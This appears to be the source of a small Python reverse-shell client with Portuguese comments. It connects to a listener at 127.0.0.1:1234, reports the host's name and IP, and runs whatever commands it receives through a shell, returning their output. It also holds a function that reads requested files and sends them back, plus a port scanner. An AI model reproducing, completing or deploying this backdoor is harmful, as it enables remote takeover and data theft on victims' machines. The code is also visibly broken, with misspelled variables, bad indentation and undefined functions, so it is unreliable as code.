#! usr/bin/env python

#Libs
import socket
import base64
import subprocess
from datetime import datetime
import os, sys
import time

#Conexao
hostname = socket.gethostname()
ip = socket.gethostbyname(hotname)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect(("127.0.0.1", 1234))
	s.send("Conexao Feita com:{} IP:{}".format(hostname, ip))

except:
	print ("Conexao Falhou...\n Deseja Tentar Novamente")
	a = str(input("s\n:"))
	if 's' == a:
		os.system("clear")
		time.sleep(2)
		s.connect(("127.0.0.1", 1234))
		s.send("Conexao Feita com:{} IP:{}".format(hostname, ip))
	elif 'n' == a:
		print ("Saindo...")
		s.close()
		os.system("exit")

#Fucoes
def download():
	while True:
	data = decode(s.recv(1024))
	file = open('{}'.format(data), 'rb')
	for i in file.readlines():
		s.send(i)
def scan():
	target = decode(s.recv(1024))
	result = open('abertas.txt', 'w')
	portas = range(1,10000)
	for port in portas:
		codigo = s.connect_ex((target, port))
		s.settimeout(0.2)
		if '0' == codigo:
			result.write('[+] Port:{} Open\n'.format(port))
			s.close()
	r = open('abertas.txt', 'r')
	for i in r.readlines():
		s.send(i)

#Main
def main():
	while True:
		data = decode(s.recv(1024))
		if data[:-1] == '/exit':
			sys.close()
			s.close()
			close()
		elif 'cd' == data:
			os.chdir(data[3:].strip('\n'))
		
		elif 'download' == data:
			download()
		
		
		proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)

#Client
def client():
	main()
client()